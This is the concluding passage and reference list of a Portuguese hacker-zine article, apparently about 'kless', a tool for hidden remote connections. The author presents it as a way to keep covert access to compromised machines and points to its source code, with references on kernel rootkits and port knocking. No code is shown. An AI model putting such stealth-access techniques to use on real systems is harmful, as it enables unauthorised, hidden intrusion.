+ A intecao deste texto foi mostrar uma maneira de se estabelecer uma conexao de
+ maneira transparente para o cliente e ocultada no servidor.    Existem metodos
+ que sao  muito mais eficazes do que esse, porem estou certo de que existem ca-
+ sos no qual a utilizacao do kless ou seu   conceito satisfaz de maneira  sufi-
+ ciente as necessidades de  alguem almejando manter o acesso remoto  a maquinas
+ comprometidas.
+   Se algum leitor extender o conceito aqui ilustrado   eu   encorajo o contato
+ comigo afim de aprofundar a  discussao no assunto.
+   O codigo fonte e demais projetos relacionados ao kless podem ser encontrados
+ no endereco abaixo: http://setuid.promisc.org
+
+
+[ --- 12. Referencias:
+
+  [1] - Phrack 61 - Kernel Rootkit Experiences 
+        stealth@segfault.net 
+  [2] - The C programming Language
+        Dennis Ritchie, Brian Kernighan
+  [3] - TCP/IP Illustrated Vol.1
+        W. Richard Stevens
+  [4] - Unix Network Programming Vol.1
+        W. Richard Stevens
+  [5] - The Bug Magazine 01 - Port knocking
+        hash@gotfault.net
+  [6] - udp-client.c - kless/udp-client.c
+  [7] - RFC 1350 - Trivial File Transfer
+        Protocol version 2
+  [8] - libpcap - www.tcpdump.org
+  [9] - libnet - www.packetfactory.net/libnet
+ [10] - RFC0862 - Echo Protocol, por incrivel
+        que parece ela e' uma STD ;)   Talvez
+	tenha sido por conta da sua simplici-
+	dade. Existem mais ou menos uns  3000
+        RFC e apenas uns 80 STD, o status  de
+	padrao atingido por RFC's apos  serem
+	aprovadas pelo IETF.
+ [11] - kless/kless-echo/
+ [12] - Confesso que seria bem mais facil es-
+        crever um modulo para  o kernel   que 
+        esconda a existencia de um  processo,
+	do que  um  que simule  o jeito  como
+	kless opera.
+ [13] - O autor possui um patch ou dois  para
+        FreeBSD que imprimem uma mensagem  no
+	syslog e no console com o PID de cada
+	processo que abre um descritor para o
+	/dev/bpf e outros pontos criticos  do
+	kernel nesse assunto.
